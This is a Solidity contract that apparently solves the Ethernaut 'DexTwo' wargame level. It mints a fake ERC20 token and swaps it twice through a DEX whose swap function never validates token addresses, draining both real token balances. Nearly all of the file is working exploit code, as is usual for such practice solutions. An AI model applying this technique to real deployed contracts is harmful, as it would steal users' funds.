// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {DexTwo, IERC20} from "src/DexTwo/DexTwo.sol";
import {Evil20} from "src/DexTwo/Evil20.sol";

/**
 * Since swap no longer checks address from and address to, it is possible to put a
 * malicious ERC20 contract that returns balance(address(dexTwo)) == 1,
 * we can call swap function twice to drain all tokens
 */
contract AttackDexTwo {
    DexTwo target;
    Evil20 evil20;
    IERC20 token1;
    IERC20 token2;

    constructor(address _target) {
        target = DexTwo(_target);
        evil20 = new Evil20();
        token1 = IERC20(target.token1());
        token2 = IERC20(target.token2());
    }

    function attack() public {
        evil20.mintTokens(address(this), 3); // 1 + 2
        evil20.approve(address(target), type(uint256).max);
        evil20.mintTokens(address(target), 1);
        // Assumption is the balance of evil20 for target is 1, so amt is hardcoded as 1
        target.swap(address(evil20), address(token1), 1);
        // Dex balance will be 2 after the first transaction
        target.swap(address(evil20), address(token2), 2);

        if (token1.balanceOf(address(target)) != 0 || token2.balanceOf(address(target)) != 0) revert("drain failed");
    }
}
